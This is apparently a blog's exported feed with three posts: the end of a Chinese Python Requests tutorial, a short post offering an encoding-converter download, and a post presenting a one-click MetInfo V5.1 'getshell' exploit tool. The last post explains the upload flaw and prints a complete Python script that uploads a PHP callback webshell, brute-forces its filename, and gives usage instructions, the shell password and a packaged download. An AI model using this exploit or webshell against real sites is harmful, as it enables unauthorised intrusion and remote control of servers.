<h2 id="更加复杂的POST请求"><a href="#更加复杂的POST请求" class="headerlink" title="更加复杂的POST请求"></a>更加复杂的POST请求</h2><hr>
<p>通常，你想要发送一些编码为表单形式的数据—非常像一个HTML表单。 要实现这个，只需简单地传递一个字典给 <em>data</em> 参数。你的数据字典 在发出请求时会自动编码为表单形式:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'key1'</span>: <span class="string">'value1'</span>, <span class="string">'key2'</span>: <span class="string">'value2'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(<span class="string">"http://httpbin.org/post"</span>, data=payload)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"form"</span>: &#123;</div><div class="line">    <span class="string">"key2"</span>: <span class="string">"value2"</span>,</div><div class="line">    <span class="string">"key1"</span>: <span class="string">"value1"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>很多时候你想要发送的数据并非编码为表单形式的。如果你传递一个 string 而不是一个 dict ，那么数据会被直接发布出去。</p>
<p>例如，Github API v3接受编码为JSON的POST/PATCH数据:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> json</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.github.com/some/endpoint'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>payload = &#123;<span class="string">'some'</span>: <span class="string">'data'</span>&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, data=json.dumps(payload))</div></pre></td></tr></table></figure>
<hr>
<h2 id="POST一个多部分编码-Multipart-Encoded-的文件"><a href="#POST一个多部分编码-Multipart-Encoded-的文件" class="headerlink" title="POST一个多部分编码(Multipart-Encoded)的文件"></a>POST一个多部分编码(Multipart-Encoded)的文件</h2><hr>
<p>Requests使得上传多部分编码文件变得很简单:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>你可以显式地设置文件名，文件类型和请求头:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果你想，你也可以发送作为文件来接收的字符串:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  <span class="string">"files"</span>: &#123;</div><div class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></div><div class="line">  &#125;,</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果你发送一个非常大的文件作为 multipart/form-data 请求，你可能希望流请求(?)。默认下 requests 不支持, 但有个第三方包支持 - requests-toolbelt. 你可以阅读 toolbelt 文档 来了解使用方法。</p>
<p>在一个请求中发送多文件参考 高级用法 一节.</p>
<hr>
<h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><hr>
<p>我们可以检测响应状态码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://httpbin.org/get'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">200</span></div></pre></td></tr></table></figure>
<p>为方便引用，Requests还附带了一个内置的状态码查询对象:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code == requests.codes.ok</div><div class="line"><span class="keyword">True</span></div></pre></td></tr></table></figure>
<p>如果发送了一个失败请求(非200响应)，我们可以通过 Response.raise_for_status() 来抛出异常:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r = requests.get(<span class="string">'http://httpbin.org/status/404'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.status_code</div><div class="line"><span class="number">404</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>bad_r.raise_for_status()</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"requests/models.py"</span>, line <span class="number">832</span>, <span class="keyword">in</span> raise_for_status</div><div class="line">    <span class="keyword">raise</span> http_error</div><div class="line">requests.exceptions.HTTPError: <span class="number">404</span> Client Error</div></pre></td></tr></table></figure>
<p>但是，由于我们的例子中 r 的 status_code 是 200 ，当我们调用 raise_for_status() 时，得到的是:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.raise_for_status()</div><div class="line"><span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>一切都挺和谐哈。</p>
<hr>
<h2 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h2><hr>
<p>我们可以查看以一个Python字典形式展示的服务器响应头:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers</div><div class="line">&#123;</div><div class="line">    <span class="string">'content-encoding'</span>: <span class="string">'gzip'</span>,</div><div class="line">    <span class="string">'transfer-encoding'</span>: <span class="string">'chunked'</span>,</div><div class="line">    <span class="string">'connection'</span>: <span class="string">'close'</span>,</div><div class="line">    <span class="string">'server'</span>: <span class="string">'nginx/1.0.4'</span>,</div><div class="line">    <span class="string">'x-runtime'</span>: <span class="string">'148ms'</span>,</div><div class="line">    <span class="string">'etag'</span>: <span class="string">'"e1ca502697e5c9317743dc078f67693f"'</span>,</div><div class="line">    <span class="string">'content-type'</span>: <span class="string">'application/json'</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>但是这个字典比较特殊：它是仅为HTTP头部而生的。根据 RFC 2616 ， HTTP头部是大小写不敏感的。</p>
<p>因此，我们可以使用任意大写形式来访问这些响应头字段:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers[<span class="string">'Content-Type'</span>]</div><div class="line"><span class="string">'application/json'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.headers.get(<span class="string">'content-type'</span>)</div><div class="line"><span class="string">'application/json'</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><hr>
<p>如果某个响应中包含一些Cookie，你可以快速访问它们:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://example.com/some/cookie/setting/url'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.cookies[<span class="string">'example_cookie_name'</span>]</div><div class="line"><span class="string">'example_cookie_value'</span></div></pre></td></tr></table></figure>
<p>要想发送你的cookies到服务器，可以使用 cookies 参数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/cookies'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>cookies = dict(cookies_are=<span class="string">'working'</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(url, cookies=cookies)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</div><div class="line"><span class="string">'&#123;"cookies": &#123;"cookies_are": "working"&#125;&#125;'</span></div></pre></td></tr></table></figure>
<hr>
<h2 id="重定向与请求历史"><a href="#重定向与请求历史" class="headerlink" title="重定向与请求历史"></a>重定向与请求历史</h2><hr>
<p>默认情况下，除了 HEAD, Requests会自动处理所有重定向。</p>
<p>可以使用响应对象的 history 方法来追踪重定向。</p>
<p><strong>Response.history</strong> 是一个:<em>class:Response&lt;requests.Response&gt;</em> 对象的列表，为了完成请求而创建了这些对象。这个对象列表按照从最老到最近的请求进行排序。</p>
<p>例如，Github将所有的HTTP请求重定向到HTTPS。:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; r = requests.get(&apos;http://github.com&apos;)</div><div class="line">&gt;&gt;&gt; r.url</div><div class="line">&apos;https://github.com/&apos;</div><div class="line">&gt;&gt;&gt; r.status_code</div><div class="line">200</div><div class="line">&gt;&gt;&gt; r.history</div><div class="line">[&lt;Response [301]&gt;]</div></pre></td></tr></table></figure>
<p>如果你使用的是GET, OPTIONS, POST, PUT, PATCH 或者 DELETE,，那么你可以通过 allow_redirects 参数禁用重定向处理:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">False</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</div><div class="line"><span class="number">301</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</div><div class="line">[]</div></pre></td></tr></table></figure>
<p>如果你使用的是HEAD，你也可以启用重定向:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.head(<span class="string">'http://github.com'</span>, allow_redirects=<span class="keyword">True</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</div><div class="line"><span class="string">'https://github.com/'</span></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</div><div class="line">[&lt;Response [<span class="number">301</span>]&gt;]</div></pre></td></tr></table></figure>
<hr>
<h2 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h2><hr>
<p>你可以告诉requests在经过以 timeout 参数设定的秒数时间之后停止等待响应:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://github.com'</span>, timeout=<span class="number">0.001</span>)</div><div class="line">Traceback (most recent call last):</div><div class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</div><div class="line">requests.exceptions.Timeout: HTTPConnectionPool(host=<span class="string">'github.com'</span>, port=<span class="number">80</span>): Request timed out. (timeout=<span class="number">0.001</span>)</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>注::</strong><br>timeout 仅对连接过程有效，与响应体的下载无关。timeout并不是整个下载响应的时间限制，而是如果服务器在<code>timeout</code>秒内没有应答，将会引发一个异常（更精确地说，是在<code>timeout</code>秒内没有从基础套接字上接收到任何字节的数据时）</p>
</blockquote>
<hr>
<h2 id="错误与异常"><a href="#错误与异常" class="headerlink" title="错误与异常"></a>错误与异常</h2><hr>
<p>遇到网络问题（如：DNS查询失败、拒绝连接等）时，Requests会抛出一个 <strong>ConnectionError</strong> 异常。</p>
<p>遇到罕见的无效HTTP响应时，Requests则会抛出一个 <strong>HTTPError</strong> 异常。</p>
<p>若请求超时，则抛出一个 <strong>Timeout</strong> 异常。</p>
<p>若请求超过了设定的最大重定向次数，则会抛出一个 <strong>TooManyRedirects</strong> 异常。</p>
<p>所有Requests显式抛出的异常都继承自 <strong>requests.exceptions.RequestException</strong> 。</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[编码转换工具]]></title>
      <url>http://akkuman.coding.me/2016/06/09/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.html</url>
      <content type="html"><![CDATA[<p><strong>闲来无事，写了款编码转换工具</strong></p>
<p><strong>以我的审美来看，界面应该算美丽</strong></p>
<hr>
<p><strong>截图 :</strong></p>
<hr>
<p><img src="http://7xusrl.com1.z0.glb.clouddn.com/%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7.png" alt="Akkuman"><br><a id="more"></a></p>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="http://cloud.189.cn/t/yueaMb7VnmAb" target="_blank" rel="external"><strong>编码转换工具</strong></a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 53xiaoshou.com | hacktech.cn</em></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MetInfo V5.1 GetShell一键化工具]]></title>
      <url>http://akkuman.coding.me/2016/06/08/MetInfo-V5-1-GetShell%E4%B8%80%E9%94%AE%E5%8C%96%E5%B7%A5%E5%85%B7.html</url>
      <content type="html"><![CDATA[<hr>
<h1 id="漏洞解析："><a href="#漏洞解析：" class="headerlink" title="漏洞解析："></a>漏洞解析：</h1><hr>
<p><strong>config/config.inc.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">$langoks = $db-&gt;get_one(<span class="string">"SELECT * FROM $met_lang WHERE lang='$lang'"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks)<span class="keyword">die</span>(<span class="string">'No data in the database,please reinstall.'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!$langoks[useok]&amp;&amp;!$metinfoadminok)okinfo(<span class="string">'../404.html'</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(count($met_langok)==<span class="number">1</span>)$lang=$met_index_type;</div><div class="line"></div><div class="line">$query = <span class="string">"SELECT * FROM $met_config WHERE lang='$lang' or lang='metinfo'"</span>;<span class="comment">//看这里</span></div><div class="line"></div><div class="line">$result = $db-&gt;query($query);</div><div class="line"></div><div class="line"><span class="keyword">while</span>($list_config= $db-&gt;fetch_array($result))&#123;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($metinfoadminok)$list_config[<span class="string">'value'</span>]=str_replace(<span class="string">'"'</span>, <span class="string">'&amp;#34;'</span>, str_replace(<span class="string">"'"</span>, <span class="string">'&amp;#39;'</span>,$list_config[<span class="string">'value'</span>]));</div><div class="line"></div><div class="line">	$settings_arr[]=$list_config;</div><div class="line"></div><div class="line">	<span class="keyword">if</span>($list_config[<span class="string">'columnid'</span>])&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>].<span class="string">'_'</span>.$list_config[<span class="string">'columnid'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line"></div><div class="line">		$settings[$list_config[<span class="string">'name'</span>]]=$list_config[<span class="string">'value'</span>];</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">@extract($settings);</div></pre></td></tr></table></figure></p>
<hr>
<a id="more"></a>
<p>访问</p>
<p><a href="http:///localhost/metinfo5.1/index.php?lang=metinfo" target="_blank" rel="external">http:///localhost/metinfo5.1/index.php?lang=metinfo</a></p>
<p><code>SELECT * FROM met_config WHERE lang=&#39;metinfo&#39; or lang=&#39;metinfo&#39;</code></p>
<hr>
<h2 id="文件命名方式："><a href="#文件命名方式：" class="headerlink" title="文件命名方式："></a>文件命名方式：</h2><hr>
<p><strong>/feedback/uploadfile_save.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">srand((double)microtime() * <span class="number">1000000</span>);</div><div class="line"></div><div class="line">$rnd = rand(<span class="number">100</span>, <span class="number">999</span>);</div><div class="line"></div><div class="line">$name = date(<span class="string">'U'</span>) + $rnd;</div><div class="line"></div><div class="line">$name = $name.<span class="string">"."</span>.$ext;</div></pre></td></tr></table></figure></p>
<p><strong>文件保存在/upload/file/目录</strong></p>
<p>命名方式就是时间戳去掉后三位，紧接着一个三位数的随机数</p>
<p>可爆破：</p>
<p>如</p>
<p><a href="http://127.0.0.1/upload/file/1465394396.php" target="_blank" rel="external">http://127.0.0.1/upload/file/1465394396.php</a></p>
<hr>
<h1 id="一键化利用工具："><a href="#一键化利用工具：" class="headerlink" title="一键化利用工具："></a>一键化利用工具：</h1><hr>
<p><strong>本程序基于python编写</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment">#-*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> Queue</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.10 Safari/537.36'</span>&#125;</div><div class="line"></div><div class="line">urls = Queue.Queue()</div><div class="line"><span class="comment">#http://hb.jhxjd.com/upload/file/1441445378.php</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">bp</span><span class="params">(urls,time_out)</span>:</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> urls.empty():</div><div class="line">        base_url = urls.get()</div><div class="line">        response = <span class="keyword">None</span></div><div class="line"></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            time.sleep(int(time_out))<span class="comment">#延时设置</span></div><div class="line">            response = requests.get(base_url,headers=headers)</div><div class="line">            <span class="keyword">if</span> response.status_code == <span class="number">404</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Not Fount----%s\n'</span> % base_url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            <span class="keyword">if</span> response:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'url.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(<span class="string">'%s?e=YXNzZXJ0\n'</span>%base_url)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(target_url,thread_num,time_out)</span>:</span></div><div class="line"></div><div class="line">    <span class="comment">#取出当前时间戳并删除后四位</span></div><div class="line">    now = str(int(time.time()))[:<span class="number">-4</span>]</div><div class="line"></div><div class="line">    <span class="comment">#将所有的待爆破地址遍历并加入队列</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>,<span class="number">1000</span>):</div><div class="line">            num_str = <span class="string">''</span>.join((str(i),str(j)))</div><div class="line">            url = <span class="string">''</span>.join((<span class="string">'%s/upload/file/%s'</span> % (target_url,now),num_str,<span class="string">'.php'</span>))</div><div class="line">            urls.put(url)</div><div class="line"></div><div class="line">    <span class="comment">#上传文件</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'xiaoma.php'</span>,<span class="string">'w+'</span>) <span class="keyword">as</span> fi:</div><div class="line">        fi.write(<span class="string">"&lt;?php $e = $_REQUEST['e'];register_shutdown_function(base64_decode($e), $_REQUEST['Akkuman']);?&gt;"</span>)</div><div class="line">    data = &#123;</div><div class="line">            <span class="string">'fd_para[1][para]'</span>:<span class="string">'filea'</span>,</div><div class="line">            <span class="string">'fd_para[1][type]'</span>:<span class="string">'5'</span></div><div class="line">            &#125;</div><div class="line">    files = &#123;<span class="string">'filea'</span>: open(<span class="string">"xiaoma.php"</span>, <span class="string">'rb'</span>)&#125;</div><div class="line">    upload_url = <span class="string">'%s/feedback/uploadfile_save.php?met_file_format=pphphp&amp;met_file_maxsize=9999&amp;lang=metinfo'</span> % target_url</div><div class="line">    res = requests.post(upload_url,data = data,files=files)</div><div class="line">    <span class="comment">#等待两秒  文件上传</span></div><div class="line">    time.sleep(<span class="number">2</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="comment">#启动多线程</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(thread_num)):</div><div class="line">        t = threading.Thread(target = bp,args=(urls,time_out,))</div><div class="line">        t.start()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Example : %s http://www.xxx.com 20 0'</span> % sys.argv[<span class="number">0</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        main(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>],sys.argv[<span class="number">3</span>])</div></pre></td></tr></table></figure>
<p>程序略显粗糙</p>
<p>为了方便，我也把他打包成了<strong>exe</strong></p>
<p>然后闲着没事，想着简单地给他做了个<strong>界面</strong>,这样的<br><img src="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png" alt="GUI"></p>
<hr>
<h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
<blockquote>
<p>MetInfo V5.1上传漏洞getshell利用工具</p>
<pre><code>作者 : Akkuman
</code></pre><p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
<p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
<p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
<p>GUI程序，应该不用说</p>
<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
<p>菜刀连接，密码是Akkuman</p>
<p>爆破结果会生成在<strong>url.txt</strong></p>
</blockquote>
<hr>
<h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><hr>
<p><a href="http://cloud.189.cn/t/v263QbMJVJ3u" target="_blank" rel="external">(访问码:1475)</a></p>
<p><em>转载请注明出处</em></p>
<p><em>作者博客 hacktech.cn | 53xiaoshuo.com</em></p>
]]></content>
      
        <categories>
            
            <category> Hacker </category>
            
        </categories>
        
        
        <tags>
